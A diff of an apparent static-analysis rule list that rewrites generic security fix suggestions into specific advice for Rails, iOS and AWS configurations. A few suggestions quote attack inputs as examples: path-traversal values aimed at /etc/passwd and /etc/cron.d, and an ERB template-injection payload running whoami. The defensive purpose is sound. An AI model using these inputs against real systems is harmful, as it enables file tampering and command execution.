-                "Sensitive data in logs (passwords, tokens, PII) violates privacy regulations and enables credential theft via log access. Use structured logging with a sensitive-field filter. Redact: logger.info('auth', user=user_id, password='[REDACTED]'). Never log request bodies that may contain credentials."
+                "config.log_level = :debug in production logs: SQL queries with parameters, request headers with tokens, session data, and user PII. Set: config.log_level = :info for production. Use tagged logging: config.log_tags = [:request_id] for request correlation."
             ),
     },
     {
@@ -26556,7 +26556,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Tempfile name from user input may enable path traversal or symlink attacks",
         "severity": Severity.WARN,
             "suggestion": (
-                "User input in file paths enables path traversal. An input of ../../etc/passwd reads system files. Use os.path.realpath() and verify the resolved path starts with your allowed base directory: resolved = os.path.realpath(os.path.join(base, user_input)); assert resolved.startswith(os.path.realpath(base)). Use pathlib for cleaner path handling."
+                "Tempfile.new(params[:name]) — attacker sends name with path separators: ../../etc/cron.d/backdoor. Use: Tempfile.new(['prefix', '.ext']) with fixed prefix. Or Dir::Tmpname.create(['safe', '.tmp']) {}. Never use user input in temp file names."
             ),
     },
     {
@@ -26565,7 +26565,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Treating all requests as local in production exposes detailed error pages",
         "severity": Severity.WARN,
             "suggestion": (
-                "Error handling issue. Catch specific exceptions, log with context (operation, input, error), and either recover or propagate. Never return None/null to signal errors — use exceptions or Result types. Ensure error messages don't leak internal details to end users."
+                "config.consider_all_requests_local = true in production shows: full stack traces, SQL queries, request parameters, and Rails version. Set: config.consider_all_requests_local = false. Create custom error pages in public/404.html and public/500.html."
             ),
     },
     {
@@ -26574,7 +26574,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "ERB template rendering from user input enables server-side template injection (SSTI)",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "ERB.new(params[:template]).result enables SSTI — an attacker sends: <%= `whoami` %>. Never use user input as ERB template source. For user-customizable content: use a restricted template language (Liquid) or Markdown with sanitization."
             ),
     },
     {
@@ -26583,7 +26583,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Keychain item accessible when device is locked exposes credentials if device is stolen",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "kSecAttrAccessibleWhenUnlocked exposes keychain items when the device is locked but recently unlocked. Use kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly — items are only accessible when device has a passcode set and is unlocked. Items are deleted if passcode is removed."
             ),
     },
     {
@@ -26592,7 +26592,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Disabling hit testing on biometric UI elements may enable authentication bypass",
         "severity": Severity.WARN,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "Disabling hit testing (isUserInteractionEnabled = false) on biometric UI lets attackers overlay invisible views to capture touches. Keep hit testing enabled on all authentication UI elements. Use LocalAuthentication framework's evaluatePolicy() which manages its own secure UI."
             ),
     },
     {
@@ -26601,7 +26601,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Biometric authentication fallback grants access on failure enabling bypass",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "LAContext evaluatePolicy fallback that grants access on .userFallback or .systemCancel allows bypass. Only grant access on .success. Handle all failure cases: .userFallback should prompt for password, .userCancel should deny access, .systemCancel should retry."
             ),
     },
     {
@@ -26610,7 +26610,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Storing sensitive data in UserDefaults which is unencrypted and backed up to iCloud",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Weak or misconfigured cryptography. Use modern algorithms: AES-256-GCM for symmetric encryption, RSA-2048+ or Ed25519 for asymmetric, SHA-256+ for hashing. Use established libraries (cryptography for Python, crypto for Node.js) — never implement crypto yourself."
+                "UserDefaults is a plist file readable by any process and backed up to iCloud unencrypted. Store sensitive data in Keychain: SecItemAdd with kSecClassGenericPassword. For large data: use FileProtectionComplete with Data Protection API."
             ),
     },
     {
@@ -26619,7 +26619,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "HTTP request via URLSession without TLS exposes data to network interception",
         "severity": Severity.WARN,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "URLSession without HTTPS (http://) sends data in plaintext. Set NSAppTransportSecurity in Info.plist to enforce HTTPS. Remove NSAllowsArbitraryLoads: true. For specific domains: use NSExceptionDomains with NSExceptionMinimumTLSVersion set to TLSv1.2."
             ),
     },
     {
@@ -26628,7 +26628,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Copying sensitive data to system pasteboard exposes it to other applications",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: Copying sensitive data to system pasteboard exposes it to other applications. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "UIPasteboard.general.string = secret copies to the system pasteboard readable by all apps. Use UIPasteboard with expirationDate: pasteboard.setItems([[key: value]], options: [.expirationDate: Date(timeIntervalSinceNow: 30)]). Clear after use. Consider using LocalAuthentication instead of copy/paste for secrets."
             ),
     },
     {
@@ -26637,7 +26637,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Logging sensitive data which persists in device logs accessible via Console.app",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Sensitive data in logs (passwords, tokens, PII) violates privacy regulations and enables credential theft via log access. Use structured logging with a sensitive-field filter. Redact: logger.info('auth', user=user_id, password='[REDACTED]'). Never log request bodies that may contain credentials."
+                "os_log or print with sensitive data persists in Console.app and crash logs. Use os_log with privacy annotation: os_log(.info, 'User authenticated: %{private}@', userId). The %{private} redacts the value in non-debug builds. Never log: tokens, passwords, or PII."
             ),
     },
     {
@@ -26646,7 +26646,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Accepting both proceed and unspecified trust results weakens certificate validation",
         "severity": Severity.WARN,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "SecTrustEvaluate that accepts .proceed AND .unspecified trusts certificates that the system would reject. Only accept .unspecified (system-trusted) or validate specific pins. .proceed means 'user explicitly overrode' — apps should not auto-accept overrides."
             ),
     },
     {
@@ -26655,7 +26655,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Force-unwrapping server trust without validation disables SSL certificate checking",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "SecTrust force-unwrap (trust!) without calling SecTrustEvaluateWithError skips certificate validation entirely. Always: var error: CFError?; let isValid = SecTrustEvaluateWithError(trust, &error); guard isValid else { cancel connection }."
             ),
     },
     {
@@ -26664,7 +26664,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Hardcoded base64 string in source code may be an embedded secret or API key",
         "severity": Severity.WARN,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "Base64 strings in source code are trivially decoded: echo 'string' | base64 -d. If it is an API key or secret: move to Keychain or environment variable. If it is a certificate: load from the app bundle's security-scoped resource. Base64 is encoding, not encryption."
             ),
     },
     {
@@ -26673,7 +26673,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Jailbreak detection via simple file existence check is easily bypassed",
         "severity": Severity.INFO,
             "suggestion": (
-                "Security or quality issue: Jailbreak detection via simple file existence check is easily bypassed. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "Checking for /Applications/Cydia.app or /bin/bash is trivially bypassed by renaming the file. Use multiple detection vectors: canOpenURL for Cydia/Sileo, fork() return value (succeeds on jailbroken), stat() on sensitive paths, and dlopen() for MobileSubstrate. No single check is sufficient."
             ),
     },
     {
@@ -26682,7 +26682,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "UIWebView is deprecated and has known security vulnerabilities; use WKWebView instead",
         "severity": Severity.WARN,
             "suggestion": (
-                "Deprecated API or pattern — will be removed in a future version, potentially breaking your application without warning. Migrate to the recommended replacement now. Check the library's migration guide for the specific replacement and any behavioral differences."
+                "UIWebView was deprecated in iOS 12 and rejected from App Store since April 2020. Migrate to WKWebView: let webView = WKWebView(frame: .zero, configuration: config). WKWebView runs in a separate process, has better security isolation, and supports content rules."
             ),
     },
     {
@@ -26691,7 +26691,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "WebView with JavaScript enabled without content rules may be vulnerable to XSS",
         "severity": Severity.INFO,
             "suggestion": (
-                "Cross-site scripting (XSS) via unsanitized user input in HTML context. Sanitize output based on context: HTML body: escape <>&\'' characters. HTML attributes: quote and escape. JavaScript: JSON.stringify(). URL: encodeURIComponent(). Use DOMPurify for HTML, or framework auto-escaping (React JSX, Vue templates)."
+                "WKWebView with JavaScript enabled loads untrusted content that can access JavaScript APIs. Add content rules: let rules = WKContentRuleListStore.default(); compile rules to block scripts from untrusted domains. Or disable JavaScript entirely if only rendering HTML: config.preferences.javaScriptEnabled = false."
             ),
     },
     {
@@ -26700,7 +26700,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Biometric-only keychain access without device passcode fallback may lock users out",
         "severity": Severity.INFO,
             "suggestion": (
-                "Concurrency issue — unsynchronized access to shared mutable state. For databases: use transactions. For in-memory: use threading.Lock() (Python), sync.Mutex (Go), or synchronized/ReentrantLock (Java). For distributed systems: use Redis SETNX or database advisory locks for distributed locking."
+                "kSecAccessControlBiometryCurrentSet without .or(.devicePasscode) locks users out if they change their biometric enrollment (new fingerprint). Use: SecAccessControlCreateWithFlags(nil, .whenPasscodeSetThisDeviceOnly, [.biometryCurrentSet, .or, .devicePasscode], nil). This allows passcode fallback."
             ),
     },
     {
@@ -26709,7 +26709,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "DES encryption is cryptographically broken; use kCCAlgorithmAES128 or higher",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Weak or misconfigured cryptography. Use modern algorithms: AES-256-GCM for symmetric encryption, RSA-2048+ or Ed25519 for asymmetric, SHA-256+ for hashing. Use established libraries (cryptography for Python, crypto for Node.js) — never implement crypto yourself."
+                "kCCAlgorithmDES uses 56-bit keys — brute force takes hours on modern hardware. Replace with kCCAlgorithmAES128 (128-bit key minimum). Use CCCrypt with kCCAlgorithmAES, kCCOptionPKCS7Padding, and a random IV generated via SecRandomCopyBytes."
             ),
     },
     {
@@ -26718,7 +26718,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "SecRandomCopyBytes failure should be handled; silently returning default produces predictable output",
         "severity": Severity.WARN,
             "suggestion": (
-                "Math.random() / random.random() are not cryptographically secure — output is predictable. For tokens, keys, nonces: use secrets.token_hex(32) (Python), crypto.randomBytes(32) (Node.js), crypto/rand.Read() (Go). For UUIDs: use uuid4 (random) not uuid1 (MAC-based)."
+                "if SecRandomCopyBytes(kSecRandomDefault, count, &bytes) != errSecSuccess { return defaultBytes } returns predictable output. Handle failure: fatalError() during initialization, or retry with a different entropy source. Cryptographic randomness failure is a critical error, not a fallback scenario."
             ),
     },
     {
@@ -26727,7 +26727,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Jailbreak detection via URL scheme checking is trivially bypassed",
         "severity": Severity.INFO,
             "suggestion": (
-                "Security or quality issue: Jailbreak detection via URL scheme checking is trivially bypassed. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "canOpenURL('cydia://') is bypassed by removing URL scheme registration or hooking canOpenURL. Combine with: stat-based checks, sandbox integrity verification (write to /private), and code signature validation. Jailbreak detection should use 3+ independent vectors."
             ),
     },
     {
@@ -26736,7 +26736,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "URLSession without minimum TLS version allows connections over deprecated TLS 1.0/1.1",
         "severity": Severity.WARN,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "URLSession without TLSMinimumSupportedProtocolVersion allows TLS 1.0/1.1 connections (POODLE, BEAST). Set: let config = URLSessionConfiguration.default; config.tlsMinimumSupportedProtocolVersion = .TLSv12. In Info.plist: NSExceptionMinimumTLSVersion = TLSv1.2."
             ),
     },
     {
@@ -26745,7 +26745,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Back/forward navigation gestures in auth or payment WebView may skip validation",
         "severity": Severity.WARN,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "WKWebView with allowsBackForwardNavigationGestures in auth/payment flows lets users swipe back to pre-auth state while maintaining the authenticated session. Disable: webView.allowsBackForwardNavigationGestures = false for auth flows. Clear session on navigation."
             ),
     },
     {
@@ -26754,7 +26754,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Reading secrets from plist file which is not encrypted and included in app bundle",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "Info.plist and custom .plist files are included unencrypted in the app bundle — anyone with the .ipa can extract them. Store secrets in Keychain via SecItemAdd. For configuration: use server-side config fetched over TLS at launch."
             ),
     },
     {
@@ -26763,7 +26763,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Embedded HTTP server in iOS app exposes local attack surface",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Embedded HTTP server in iOS app exposes local attack surface. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "GCDWebServer or Swifter embedded in an iOS app opens a local port accessible to other apps on the device and potentially the local network. If needed: bind to 127.0.0.1 only, use a random port, require authentication on all endpoints, and stop the server when backgrounded."
             ),
     },
     {
@@ -26772,7 +26772,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Creating file with sensitive data without setting file protection attributes",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security-sensitive configuration must not be hardcoded. Use environment variables for secrets, configuration files for non-sensitive settings, and a secrets manager for production. Validate all configuration at startup — fail fast with a clear error, not silently at runtime."
+                "FileManager.createFile without NSFileProtectionComplete leaves files readable when device is locked. Use: try data.write(to: url, options: [.completeFileProtection]). Or set: try FileManager.default.setAttributes([.protectionKey: FileProtectionType.complete], ofItemAtPath: path)."
             ),
     },
     {
@@ -26781,7 +26781,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Resolving symlinks without sandbox path validation may escape the app container",
         "severity": Severity.WARN,
             "suggestion": (
-                "User input in file paths enables path traversal. An input of ../../etc/passwd reads system files. Use os.path.realpath() and verify the resolved path starts with your allowed base directory: resolved = os.path.realpath(os.path.join(base, user_input)); assert resolved.startswith(os.path.realpath(base)). Use pathlib for cleaner path handling."
+                "URL.resolvingSymlinksInPath() followed by file access without verifying the result stays within the app sandbox enables container escape. After resolving: guard resolvedPath.hasPrefix(appContainerPath) else { throw SecurityError.pathEscape }. Check BOTH before and after resolution."
             ),
     },
     {
@@ -26790,7 +26790,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Displaying PII in map pin annotations may expose sensitive data in screenshots",
         "severity": Severity.INFO,
             "suggestion": (
-                "Security or quality issue: Displaying PII in map pin annotations may expose sensitive data in screenshots. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "MKAnnotationView showing full name, address, or phone number is visible in screenshots, screen recordings, and over-the-shoulder viewing. Display only the minimum needed: initials or a generic label. Show full PII only in a detail view with explicit user action."
             ),
     },
     {
@@ -26799,7 +26799,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "IAM role trust policy allows any AWS account to assume the role",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: IAM role trust policy allows any AWS account to assume the role. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "AssumeRolePolicyDocument with Principal: { AWS: '*' } lets ANY AWS account assume this role. Specify exact accounts: Principal: { AWS: 'arn:aws:iam::123456789012:root' }. Add Condition: { StringEquals: { 'aws:PrincipalOrgID': 'o-xxxxx' } } for organization-level restriction."
             ),
     },
     {
@@ -26808,7 +26808,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "VPC defined without flow logs prevents network traffic auditing",
         "severity": Severity.WARN,
             "suggestion": (
-                "Excessive or insecure logging practice detected. Use structured logging with appropriate levels: ERROR for failures, WARNING for recoverable issues, INFO for business events, DEBUG for development only. Never log: passwords, tokens, credit cards, or full request/response bodies."
+                "VPC without flow logs means no record of network traffic — cannot detect data exfiltration, port scans, or unauthorized access patterns. Enable: aws ec2 create-flow-logs --resource-type VPC --traffic-type ALL. Ship to CloudWatch Logs or S3 for SIEM analysis."
             ),
     },
     {
@@ -26817,7 +26817,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "WAF with default allow action undermines web application firewall protection",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: WAF with default allow action undermines web application firewall protection. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "WAF default action: ALLOW passes all requests that don't match any rule — the WAF does nothing for unknown attacks. Set default action: BLOCK and create explicit ALLOW rules for known-good patterns. Alternatively: use rate-based rules as catch-all before the default action."
             ),
     },
     {
@@ -26826,7 +26826,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "S3 bucket defined without server-side encryption configuration",
         "severity": Severity.WARN,
             "suggestion": (
-                "Weak or misconfigured cryptography. Use modern algorithms: AES-256-GCM for symmetric encryption, RSA-2048+ or Ed25519 for asymmetric, SHA-256+ for hashing. Use established libraries (cryptography for Python, crypto for Node.js) — never implement crypto yourself."
+                "S3 bucket without ServerSideEncryptionConfiguration stores objects in plaintext on disk. Add: BucketEncryption with ServerSideEncryptionByDefault: SSEAlgorithm: aws:kms (CMK) or AES256 (S3-managed). Use KMS for key rotation and audit trail via CloudTrail."
             ),
     },
     {
@@ -26835,7 +26835,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "RDS instance publicly accessible exposes database to internet-based attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Follow the principle of least privilege: grant only the minimum permissions required for the operation. Validate authorization on every request, not just authentication. Use role-based access control (RBAC) with specific permissions per role."
+                "PubliclyAccessible: true on RDS gives the database a public IP reachable from the internet. Set PubliclyAccessible: false. Place in a private subnet. Access via: VPN, bastion host, RDS Proxy, or AWS PrivateLink. Security groups are not sufficient alone."
             ),
     },
     {
@@ -26844,7 +26844,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Security group open to all IP addresses enables unauthorized access",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "Security group with CidrIp: 0.0.0.0/0 allows inbound from any IP. Restrict to specific CIDRs: your VPN range for SSH/RDP, your CDN IPs for HTTP, and security group references for internal traffic. Use VPC endpoints to avoid public internet entirely."
             ),
     },
     {
@@ -26853,7 +26853,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "IAM policy with wildcard action and resource grants full administrative access",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Follow the principle of least privilege: grant only the minimum permissions required for the operation. Validate authorization on every request, not just authentication. Use role-based access control (RBAC) with specific permissions per role."
+                "IAM with Action: '*' and Resource: '*' is equivalent to root access. Create purpose-specific policies: Actions limited to the service used, Resources scoped to specific ARNs. Use AWS Access Analyzer to generate least-privilege policies from CloudTrail activity."
             ),
     },
     {
@@ -26862,7 +26862,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "CloudTrail logging disabled prevents audit trail of AWS API activity",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Excessive or insecure logging practice detected. Use structured logging with appropriate levels: ERROR for failures, WARNING for recoverable issues, INFO for business events, DEBUG for development only. Never log: passwords, tokens, credit cards, or full request/response bodies."
+                "Without CloudTrail, there is no record of who did what in the AWS account — API calls, console logins, and resource changes are invisible. Enable: aws cloudtrail create-trail --name org-trail --is-multi-region-trail --is-organization-trail. Log to an S3 bucket with versioning."
             ),
     },
     {
@@ -26871,7 +26871,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "EBS volume without encryption at rest exposes data if hardware is compromised",
         "severity": Severity.WARN,
             "suggestion": (
-                "Weak or misconfigured cryptography. Use modern algorithms: AES-256-GCM for symmetric encryption, RSA-2048+ or Ed25519 for asymmetric, SHA-256+ for hashing. Use established libraries (cryptography for Python, crypto for Node.js) — never implement crypto yourself."
+                "Unencrypted EBS volumes expose data if the underlying hardware is decommissioned or a snapshot is shared. Enable: Encrypted: true in the volume definition. For existing volumes: create an encrypted snapshot, then create a new volume from it. Set account-level default encryption."
             ),
     },
     {
@@ -26880,7 +26880,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Elasticsearch domain without node-to-node encryption exposes data in transit",
         "severity": Severity.WARN,
             "suggestion": (
-                "Weak or misconfigured cryptography. Use modern algorithms: AES-256-GCM for symmetric encryption, RSA-2048+ or Ed25519 for asymmetric, SHA-256+ for hashing. Use established libraries (cryptography for Python, crypto for Node.js) — never implement crypto yourself."
+                "Elasticsearch without NodeToNodeEncryptionOptions sends data between nodes in plaintext — visible on the VPC network. Enable: NodeToNodeEncryptionOptions: Enabled: true AND EncryptionAtRestOptions: Enabled: true. Both are required for full data protection."
             ),
     },
     {
@@ -26889,7 +26889,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Lambda function with maximum timeout may indicate unbounded processing and cost overrun",
         "severity": Severity.INFO,
             "suggestion": (
-                "Missing resilience pattern for external calls. Add: connection timeout (5s), read timeout (30s), retries with exponential backoff (max 3 attempts, 1s/2s/4s delays), and circuit breaker for repeated failures. Without these, a slow dependency cascades into your service's outage."
+                "Lambda Timeout: 900 (15min maximum) without matching SQS visibility timeout or DLQ causes: duplicate processing if SQS re-delivers, cost overrun from hung functions, and cascading failures. Set timeout to actual expected duration + 20% buffer. Add DLQ for failed invocations."
             ),
     },
     {
@@ -26898,7 +26898,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "IAM user with wildcard AssumeRole can escalate privileges to any role",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Follow the principle of least privilege: grant only the minimum permissions required for the operation. Validate authorization on every request, not just authentication. Use role-based access control (RBAC) with specific permissions per role."
+                "IAM user with AssumeRole on Resource: '*' can assume ANY role in the account including admin roles. Scope: Resource: ['arn:aws:iam::*:role/SpecificRoleName']. Use aws:PrincipalTag conditions to further restrict which users can assume which roles."
             ),
     },
     {
@@ -26907,7 +26907,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "SNS topic policy with wildcard principal allows any account to publish",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: SNS topic policy with wildcard principal allows any account to publish. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "SNS topic policy with Principal: '*' lets any AWS account publish messages — spam, phishing, or cost abuse via high-volume publishing. Restrict: Principal: { AWS: 'arn:aws:iam::123456789012:root' }. Add Condition: { StringEquals: { 'aws:SourceOwner': ACCOUNT_ID } }."
             ),
     },
     {
@@ -26916,7 +26916,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "SQS queue without KMS encryption stores messages in plaintext at rest",
         "severity": Severity.WARN,
             "suggestion": (
-                "Weak or misconfigured cryptography. Use modern algorithms: AES-256-GCM for symmetric encryption, RSA-2048+ or Ed25519 for asymmetric, SHA-256+ for hashing. Use established libraries (cryptography for Python, crypto for Node.js) — never implement crypto yourself."
+                "SQS without KmsMasterKeyId stores messages in plaintext at rest. Set: KmsMasterKeyId: alias/aws/sqs (AWS-managed) or a CMK ARN for customer-managed encryption. Messages are encrypted by SQS and decrypted transparently by consumers with KMS permissions."
             ),
     },
     {
@@ -26925,7 +26925,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "ECR repository without image scanning misses vulnerability detection",
         "severity": Severity.WARN,
             "suggestion": (
-                "Container security issue. Follow: run as non-root user, drop all capabilities and add only needed ones, use read-only root filesystem, pin image versions (never :latest), set resource limits, and scan images for vulnerabilities with Trivy or Grype before deployment."
+                "ECR without ImageScanningConfiguration: ScanOnPush: true misses CVEs in container images. Enable: aws ecr put-image-scanning-configuration --scan-on-push true. Use ECR enhanced scanning (Inspector integration) for OS and language-package vulnerability detection."
             ),
     },
     {
@@ -26934,7 +26934,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "EKS cluster public endpoint exposes Kubernetes API to the internet",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Container security issue. Follow: run as non-root user, drop all capabilities and add only needed ones, use read-only root filesystem, pin image versions (never :latest), set resource limits, and scan images for vulnerabilities with Trivy or Grype before deployment."
+                "EKS EndpointPublicAccess: true exposes the Kubernetes API to the internet. Set: EndpointPublicAccess: false, EndpointPrivateAccess: true. Access via VPN or bastion. If public access is needed temporarily: restrict with PublicAccessCidrs to your IP range."
             ),
     },
     {
@@ -26943,7 +26943,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Redshift cluster without encryption at rest violates data protection requirements",
         "severity": Severity.WARN,
             "suggestion": (
-                "Weak or misconfigured cryptography. Use modern algorithms: AES-256-GCM for symmetric encryption, RSA-2048+ or Ed25519 for asymmetric, SHA-256+ for hashing. Use established libraries (cryptography for Python, crypto for Node.js) — never implement crypto yourself."
+                "Redshift without Encrypted: true stores data in plaintext on the cluster nodes. Enable: aws redshift modify-cluster --encrypted --kms-key-id KEY_ID. Existing clusters require migration: create encrypted cluster, use UNLOAD/COPY to transfer data, switch DNS."
             ),
     },
     {
@@ -26952,7 +26952,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "IAM role with 12-hour session duration increases window for credential abuse",
         "severity": Severity.INFO,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "MaxSessionDuration: 43200 (12 hours) means a compromised session token is valid for half a day. Set to 1 hour (3600) for human roles, 1-4 hours for automation roles. Use credential vending with STS for short-lived access instead of long-lived sessions."
             ),
     },
     {
@@ -26961,7 +26961,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "AWS Config not recording all resource types leaves compliance gaps",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security-sensitive configuration must not be hardcoded. Use environment variables for secrets, configuration files for non-sensitive settings, and a secrets manager for production. Validate all configuration at startup — fail fast with a clear error, not silently at runtime."
+                "AWS Config with AllSupported: false or missing ResourceTypes means some resources are unmonitored — compliance rules do not evaluate them. Set: RecordingGroup: AllSupported: true, IncludeGlobalResourceTypes: true. This records ALL resource types across all regions."
             ),
     },
     {
@@ -26970,7 +26970,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "GuardDuty detector disabled removes automated threat detection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: GuardDuty detector disabled removes automated threat detection. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "GuardDuty disabled means no automated detection of: cryptocurrency mining, IAM credential exfiltration, S3 data exfiltration, or EC2 instance compromise. Enable: aws guardduty create-detector --enable. It costs ~$4/million CloudTrail events — negligible for the protection."
             ),
     },
     {
@@ -26979,7 +26979,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "API Gateway without access logging prevents request auditing",
         "severity": Severity.WARN,
             "suggestion": (
-                "Excessive or insecure logging practice detected. Use structured logging with appropriate levels: ERROR for failures, WARNING for recoverable issues, INFO for business events, DEBUG for development only. Never log: passwords, tokens, credit cards, or full request/response bodies."
+                "API Gateway without AccessLogSettings has no record of who called which endpoint, when, or what they sent. Enable: set AccessLogSettings with arn of a CloudWatch log group. Log: requestId, ip, caller, method, resourcePath, status, responseLength."
             ),
     },
     {
